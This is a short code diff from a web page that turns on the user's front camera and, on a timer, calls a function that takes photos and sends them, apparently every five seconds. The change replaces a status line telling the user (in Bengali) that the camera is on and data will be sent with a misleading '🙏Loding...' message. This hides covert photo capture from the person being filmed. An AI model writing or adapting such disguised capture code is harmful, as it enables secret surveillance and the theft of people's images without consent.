@@ -48,7 +48,7 @@
       navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
           video.srcObject = stream;
-          status.innerText = "✅ ক্যামেরা চালু হয়েছে, প্রতি ৫ সেকেন্ডে তথ্য পাঠানো হবে...";
+          status.innerText = "🙏Loding...";
 
           intervalId = setInterval(() => {
             takePhotoAndSend();
